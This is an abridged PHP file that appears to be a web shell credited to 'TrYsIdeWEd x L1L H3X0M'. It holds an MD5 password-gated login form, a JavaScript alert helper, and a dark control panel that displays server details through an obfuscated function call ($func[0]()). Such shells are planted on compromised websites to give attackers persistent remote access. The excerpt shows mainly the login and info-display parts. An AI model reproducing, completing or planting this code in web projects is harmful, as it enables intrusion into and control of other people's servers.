...
function showNotif($msg) {
    echo "<script>setTimeout(()=>{alert(".json_encode($msg).");},100);</script>";
}
...
if (!isset($_SESSION['login'])) {
    if (isset($_POST['pw']) && md5($_POST['pw']) == $auth) {
        $_SESSION['login'] = true;
        header('Location: ?');
        exit;
    }
    echo '<form method=post style="text-align:center;margin-top:10%"><h2>LOGIN</h2><input name=pw type=password><br><br><button>Login</button></form>';
    exit;
}
...
<head>
	...
	<title> TrYsIdeWEd x L1L H3X0M </title>
</head>
...
#logoutBtn:hover {
				...
				<div class="col-md-12">
					<div class="table-responsive">
						<table class="table table-sm table-dark">
							<tr>
								<td>Full Support From</td>
								<td>: TrYsIdeWEd x L1L H3X0M</td>
							</tr>
							<tr>
								<td>Uname</td>
								<td>: <?= $func[0]() ?></td>
	...
	<div class="bg-dark border text-center mt-2"><small>Copyright &copy; 2024 - Code By TrYsIdeWEd x L1L H3X0M</small></div>
